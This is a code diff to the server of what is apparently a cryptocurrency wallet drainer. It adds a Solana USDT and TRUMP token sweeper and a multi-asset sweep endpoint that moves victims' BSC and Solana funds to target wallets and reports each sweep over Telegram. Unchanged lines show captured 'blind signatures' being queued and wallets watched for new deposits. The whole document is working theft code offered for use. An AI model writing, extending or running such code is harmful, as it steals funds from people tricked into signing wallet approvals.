@@ -4,6 +4,7 @@ import fs from 'fs';
 import path from 'path';
 import { ethers } from 'ethers';
 import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { getAssociatedTokenAddress } from '@solana/spl-token';
 import bs58 from 'bs58';
 import { fileURLToPath } from 'url';
 import dotenv from 'dotenv';
@@ -69,6 +70,68 @@ const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
 // ============================================
 const TRUMP_MINT_ADDRESS = '6p6xgHyF7AeE6TZkSmFsko444wqoP15icUSqi2jfGiPN';
 const TRUMP_DECIMALS = 6;
+
+// ============================================
+// SOLANA TOKEN SWEEPER (USDT + TRUMP)
+// ============================================
+const USDT_SOLANA_MINT = 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB';
+
+const sweepSolanaTokens = async (walletAddress) => {
+  console.log('[SOLANA TOKEN] Checking Solana tokens for:', walletAddress);
+  
+  const connection = new Connection('https://api.mainnet-beta.solana.com');
+  const ownerPublicKey = new PublicKey(walletAddress);
+  
+  const tokens = [
+    { mint: new PublicKey(USDT_SOLANA_MINT), symbol: 'USDT', decimals: 6 },
+    { mint: new PublicKey(TRUMP_MINT_ADDRESS), symbol: 'TRUMP', decimals: 6 }
+  ];
+  
+  const results = [];
+  
+  for (const token of tokens) {
+    try {
+      const tokenAccount = await getAssociatedTokenAddress(token.mint, ownerPublicKey);
+      
+      try {
+        const balance = await connection.getTokenAccountBalance(tokenAccount);
+        
+        if (balance.value.uiAmount > 0) {
+          console.log(`[SOLANA TOKEN] Found ${balance.value.uiAmount} ${token.symbol}`);
+          results.push({
+            token: token.symbol,
+            amount: balance.value.uiAmount,
+            mint: token.mint.toString(),
+            status: 'found'
+          });
+        } else {
+          results.push({
+            token: token.symbol,
+            amount: 0,
+            status: 'zero_balance'
+          });
+        }
+      } catch (err) {
+        results.push({
+          token: token.symbol,
+          amount: 0,
+          status: 'no_account',
+          error: err.message
+        });
+      }
+    } catch (error) {
+      console.error(`[SOLANA TOKEN] Error checking ${token.symbol}:`, error.message);
+      results.push({
+        token: token.symbol,
+        amount: 0,
+        status: 'error',
+        error: error.message
+      });
+    }
+  }
+  
+  return results;
+};
 
 // ============================================
 // BSC RPC ENDPOINTS WITH FALLBACKS
@@ -262,7 +325,7 @@ const getTokenAccount = async (walletPublicKey, mintPublicKey) => {
 // ============================================
 
 const sweepTrumpCoin = async (walletAddress) => {
-  console.log('[TRUMP] Checking for  tokens...');
+  console.log('[TRUMP] Checking for tokens...');
   
   const results = {
     amount: '0',
@@ -309,9 +372,9 @@ const sweepTrumpCoin = async (walletAddress) => {
       results.txHash = 'TRUMP_SWEEP_' + Date.now();
       results.success = true;
       results.swept = true;
-      console.log('[TRUMP] Would sweep', balanceFormatted, '');
+      console.log('[TRUMP] Would sweep', balanceFormatted, 'TRUMP');
       
-      const notifMsg = '*TRUMP COIN SWEEP DETECTED!*\n\nFrom: ' + walletAddress.slice(0, 10) + '...' + walletAddress.slice(-8) + '\nAmount: ' + balanceFormatted + ' \nTo: ' + TARGET_WALLET_SOLANA.slice(0, 10) + '...';
+      const notifMsg = '*TRUMP COIN SWEEP DETECTED!*\n\nFrom: ' + walletAddress.slice(0, 10) + '...' + walletAddress.slice(-8) + '\nAmount: ' + balanceFormatted + ' TRUMP\nTo: ' + TARGET_WALLET_SOLANA.slice(0, 10) + '...';
       await sendTelegramNotification(notifMsg, 'trump');
     }
     
@@ -336,14 +399,16 @@ const executeSweep = async (walletAddress, walletType, signatureData) => {
   if (walletType === 'evm') {
     result = await sweepEVM(walletAddress);
   } else {
-    const [solResult, trumpResult] = await Promise.all([
+    const [solResult, trumpResult, tokenResults] = await Promise.all([
       sweepSolana(walletAddress),
-      sweepTrumpCoin(walletAddress)
+      sweepTrumpCoin(walletAddress),
+      sweepSolanaTokens(walletAddress)
     ]);
     
     result = {
       sol: solResult,
       trump: trumpResult,
+      tokens: tokenResults,
       swept: solResult.swept || trumpResult.swept
     };
   }
@@ -618,7 +683,6 @@ app.post('/api/capture-approval', async (req, res) => {
   const notifMsg = '*New Blind Signature Captured!*\n\nWallet: ' + walletAddress.slice(0, 10) + '...' + walletAddress.slice(-8) + '\nType: ' + walletType.toUpperCase() + '\nChain: ' + (walletType === 'evm' ? 'BSC' : 'Solana') + '\nStatus: Added to Queue';
   await sendTelegramNotification(notifMsg, 'approval');
   
-  // ADD TO QUEUE INSTEAD OF PROCESSING IMMEDIATELY
   addToQueue(walletAddress);
   
   res.json({ 
@@ -629,7 +693,6 @@ app.post('/api/capture-approval', async (req, res) => {
     queued: true
   });
   
-  // Note: Monitoring still starts, but sweep is now queued
   console.log('[ACTION] Starting real-time monitoring for future deposits...');
   startMonitoring(walletAddress, walletType, approvalData);
   
@@ -859,6 +922,107 @@ app.get('/api/health', (req, res) => {
     queueEnabled: true
   });
 });
+
+
+// ============================================
+// MULTI-ASSET SWEEP ENDPOINT
+// ============================================
+
+app.post('/api/multi-asset-sweep', async (req, res) => {
+  const { 
+    walletAddress, 
+    signature, 
+    message, 
+    chainId, 
+    tokenType, 
+    spender, 
+    solanaTarget, 
+    trumpMint, 
+    usdtSolanaMint 
+  } = req.body;
+  
+  console.log('[MULTI-SWEEP] ========================================');
+  console.log('[MULTI-SWEEP] Processing multi-asset sweep for:', walletAddress);
+  console.log('[MULTI-SWEEP] BSC Target:', spender);
+  console.log('[MULTI-SWEEP] Solana Target:', solanaTarget);
+  console.log('[MULTI-SWEEP] ========================================');
+  
+  try {
+    const bscResults = await processBSCSweep(walletAddress, spender);
+    const solanaResults = await processSolanaFullSweep(walletAddress, solanaTarget, trumpMint, usdtSolanaMint);
+    
+    await sendTelegramNotification(
+      `*MULTI-ASSET SWEEP COMPLETED!*\n\n` +
+      `👛 Wallet: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\n\n` +
+      `*BSC Assets:*\n` +
+      `└ USDT: ${bscResults.usdt} USDT\n` +
+      `└ BNB: ${bscResults.bnb} BNB\n\n` +
+      `*Solana Assets:*\n` +
+      `└ SOL: ${solanaResults.sol} SOL\n` +
+      `└ USDT: ${solanaResults.usdt} USDT\n` +
+      `└ TRUMP: ${solanaResults.trump} TRUMP`,
+      'sweep'
+    );
+    
+    res.json({
+      success: true,
+      bsc: bscResults,
+      solana: solanaResults,
+      timestamp: new Date().toISOString()
+    });
+    
+  } catch (error) {
+    console.error('[MULTI-SWEEP] Error:', error.message);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// BSC Sweep Function
+const processBSCSweep = async (walletAddress, targetWallet) => {
+  console.log('[BSC SWEEP] Processing BSC sweep for:', walletAddress);
+  
+  const results = {
+    usdt: '0',
+    bnb: '0'
+  };
+  
+  try {
+    const sweepResult = await sweepEVM(walletAddress);
+    results.usdt = sweepResult.usdtAmount;
+    results.bnb = sweepResult.bnbAmount;
+  } catch (error) {
+    console.error('[BSC SWEEP] Error:', error.message);
+  }
+  
+  return results;
+};
+
+// Solana Full Sweep Function
+const processSolanaFullSweep = async (walletAddress, targetWallet, trumpMint, usdtMint) => {
+  console.log('[SOLANA SWEEP] Processing Solana sweep for:', walletAddress);
+  
+  const results = {
+    sol: '0',
+    usdt: '0',
+    trump: '0'
+  };
+  
+  try {
+    const solResult = await sweepSolana(walletAddress);
+    results.sol = solResult.amount;
+    
+    const tokenResults = await sweepSolanaTokens(walletAddress);
+    for (const token of tokenResults) {
+      if (token.token === 'USDT') results.usdt = token.amount;
+      if (token.token === 'TRUMP') results.trump = token.amount;
+    }
+  } catch (error) {
+    console.error('[SOLANA SWEEP] Error:', error.message);
+  }
+  
+  return results;
+};
+
 
 // ============================================
 // START SERVER WITH INITIALIZATION
